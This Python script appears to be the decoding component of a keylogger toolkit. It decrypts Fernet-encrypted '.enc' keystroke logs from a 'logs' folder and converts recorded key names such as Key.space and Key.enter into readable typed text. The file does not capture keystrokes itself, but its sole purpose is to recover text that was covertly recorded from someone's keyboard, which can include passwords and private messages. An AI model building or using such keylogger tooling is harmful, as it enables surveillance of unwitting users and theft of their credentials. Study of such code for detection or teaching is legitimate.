from utils.config import ENCRYPTION_KEY
from cryptography.fernet import Fernet
import os

LOG_DIR = "logs"
fernet = Fernet(ENCRYPTION_KEY)

def clean_keylog(text):
    replacements = {
        "Key.space": " ",
        "Key.enter": "\n",
        "Key.tab": "\t",
        "Key.backspace": "[BACKSPACE]",
        "Key.ctrl": "",
        "Key.cmd": "",
        "Key.shift": "",
        "Key.alt": "",
        "Key.caps_lock": "",
        "Key.esc": "",
    }
    for key, val in replacements.items():
        text = text.replace(key, val)
    return text

def decrypt_file(filepath):
    print(f"\n--- Decrypted: {filepath} ---")
    with open(filepath, "rb") as file:
        for line in file:
            try:
                decrypted = fernet.decrypt(line.strip()).decode()
                cleaned = clean_keylog(decrypted)
                print(cleaned, end="")
            except Exception as e:
                print(f"\n[!] Error: {e}")

def main():
    for file in os.listdir(LOG_DIR):
        if file.endswith(".enc"):
            decrypt_file(os.path.join(LOG_DIR, file))

if __name__ == "__main__":
    main()
